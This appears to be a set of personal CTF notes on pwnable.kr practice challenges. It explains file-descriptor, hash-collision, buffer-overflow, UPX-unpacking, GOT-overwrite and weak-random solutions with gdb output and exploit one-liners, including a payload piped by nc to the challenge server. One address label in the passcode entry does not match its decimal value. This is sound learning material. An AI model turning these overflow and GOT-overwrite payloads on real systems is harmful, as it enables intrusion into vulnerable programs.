# CTF

## PWNABLE.KR

### fd
- check setuid bit set
- It can read root file.
```sh
fd@pwnable:~$ id
uid=1002(fd) gid=1002(fd) groups=1002(fd)

fd@pwnable:~$ ls -al
-r--r----- 1 fd_pwn root 50 Jun 11  2014 flag
-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd
-rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c
```

- check src/fd.c
- If ```fd``` is 0/1/2, STDIN/STDOUT,STDERR
- read flag
```sh
fd@pwnable:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
```

### collision
- check src/col.c
```sh
col@pwnable:~$ ls
col  col.c  flag
```
- According to hashcode and check_password(), make password
    - 0x21DD09EC / 5 = 0x6C5CEC8
    - 0x6C5CEC8 * 5 = 0x21DD09E8(diff 0x4)
    - result : 0x6C5CEC8 * 4 + 0x6C5CECC
- It is little endian.

- read flag
```sh
col@pwnable:~$ ./col `python -c 'print "\xC8\xCE\xC5\x06"*4+"\xCC\xCE\xC5\x06"'`
daddy! I just managed to create a hash collision :)
```

### bof
- check src/bof.c
- gdb bof
    - overflow varible : 0xffffcfdc
    - deadbeef varible : 0xffffd010
```sh
gef➤  x/40x 0xffffcfdc
0xffffcfdc:     0x00333231      0xf7fc4540      0x00000000      0xf7d994be
0xffffcfec:     0xf7fab054      0xf7fbe4a0      0xf7fd6f90      0xf7d994be
0xffffcffc:     0xc5ac9500      0xffffd040      0xf7fbe66c      0xffffd028
0xffffd00c:     0x5655569f      0xdeadbeef
```

- payload A * 52 + 0xcafebabe
```sh
(python3 -c 'print("A" * 52 + "\xbe\xba\xfe\xca")';cat) | nc pwnable.kr 9000
```

### flag

#### packer
- difficult to analyse by compressing or encrypting file. 
- find ```UPX```
```sh
coho@DESKTOP-LHPOMJF:~/src/study/CTF/src$ hexdump -C flag.out | head -n 20
00000000  7f 45 4c 46 02 01 01 03  00 00 00 00 00 00 00 00  |.ELF............|
00000010  02 00 3e 00 01 00 00 00  f0 a4 44 00 00 00 00 00  |..>.......D.....|
00000020  40 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |@...............|
00000030  00 00 00 00 40 00 38 00  02 00 40 00 00 00 00 00  |....@.8...@.....|
00000040  01 00 00 00 05 00 00 00  00 00 00 00 00 00 00 00  |................|
00000050  00 00 40 00 00 00 00 00  00 00 40 00 00 00 00 00  |..@.......@.....|
00000060  04 ad 04 00 00 00 00 00  04 ad 04 00 00 00 00 00  |................|
00000070  00 00 20 00 00 00 00 00  01 00 00 00 06 00 00 00  |.. .............|
00000080  d8 62 0c 00 00 00 00 00  d8 62 6c 00 00 00 00 00  |.b.......bl.....|
00000090  d8 62 6c 00 00 00 00 00  00 00 00 00 00 00 00 00  |.bl.............|
000000a0  00 00 00 00 00 00 00 00  00 00 20 00 00 00 00 00  |.......... .....|
000000b0  fc ac e0 a1 55 50 58 21  1c 08 0d 16 00 00 00 00  |....UPX!........|
```

- install upx packer
```sh
sudo apt-get install upx
```

- unpack binary
```sh
upx -d flag.out
```

- main
    - puts "I will malloc() and strcpy the flag there. take it."
    - rdi : malloc 0x64
    - rsi : "UPX...? sounds like a delivery service :)"
    - strcpy : call 0x400320
```sh
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401164 <+0>:     push   rbp
   0x0000000000401165 <+1>:     mov    rbp,rsp
   0x0000000000401168 <+4>:     sub    rsp,0x10
   0x000000000040116c <+8>:     mov    edi,0x496658
   0x0000000000401171 <+13>:    call   0x402080 <puts>
   0x0000000000401176 <+18>:    mov    edi,0x64
   0x000000000040117b <+23>:    call   0x4099d0 <malloc>
   0x0000000000401180 <+28>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401184 <+32>:    mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 <flag>
   0x000000000040118b <+39>:    mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040118f <+43>:    mov    rsi,rdx
   0x0000000000401192 <+46>:    mov    rdi,rax
   0x0000000000401195 <+49>:    call   0x400320
   0x000000000040119a <+54>:    mov    eax,0x0
   0x000000000040119f <+59>:    leave  
   0x00000000004011a0 <+60>:    ret    

gef➤  x $rdx
0x496628:       "UPX...? sounds like a delivery service :)"
```

### passcode
- check src/passcode.c
- If name[100] is full, passcode1 is name[96~100] (duplicated)
```sh
gef➤  disas welcome
Dump of assembler code for function welcome:
    0x00005555555552e2 <+8>:     sub    rsp,0x70 # name[100]

gef➤  disas login
Dump of assembler code for function login:
    0x0000555555555229 <+32>:    mov    eax,DWORD PTR [rbp-0x8] # passcode1
    0x0000555555555265 <+92>:    mov    eax,DWORD PTR [rbp-0x4] # passcode2
```

- passcode1 can be set by PLT's GOT using name[96~100]
```c
scanf("%d", passcode1);
```

- check fflush and system
    - PLT : 0x8048430 (call)
    - GOT : 0x804a004 (jmp)
    - system("bin/cat flag") : 0x8048430 (134514147)
```sh
(gdb) disas login
Dump of assembler code for function login:
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>  # fflush PLT
   0x080485ea <+134>:   call   0x8048460 <system@plt>

(gdb) x/i 0x8048430
   0x8048430 <fflush@plt>:      jmp    *0x804a004 # fflush GOT
```

- write user code to PLT GOT
    - payload : [dummy] + [fflush GOT] + [want to execute memory]
        - [A * 96] + [0x804a004] + [134514147]
```sh
(python -c 'print "A"*96 + "\x04\xa0\x04\x08" + "134514147"') | ./passcode 
```

### random
- check src/random.c

```sh
gef➤  disas main
Dump of assembler code for function main:
   0x00000000000011e2 <+25>:    xor    eax,eax
   0x00000000000011e4 <+27>:    mov    eax,0x0
   0x00000000000011e9 <+32>:    call   0x10d0 <rand@plt>
   0x00000000000011ee <+37>:    mov    DWORD PTR [rbp-0xc],eax

gef➤  x $eax
0x6b8b4567:     Cannot access memory at address 0x6b8b4567
```

- $eax is same(0x6b8b4567) beacuse seed is same.
```sh
(python -c 'print 0x6b8b4567 ^ 0xdeadbeef') | ./random
```
### input
- check src/input.c
1. argc is 100
2. argv["A"] is \x00
3. argv["B"] is \x20\x0a\x0d
4. write \x00\x0a\x02\xff as STDIN
5. write \x00\x0a\x02\xff as STDERR
6. \xde\xad\xbe\xef env is \xca\xfe\xba\xbe
7. read \x00\x00\x00\x00 in file named \x0a
8. read \xde\xad\xbe\xef in socket argv["C"] port

# leg
- check src/leg.c, leg.asm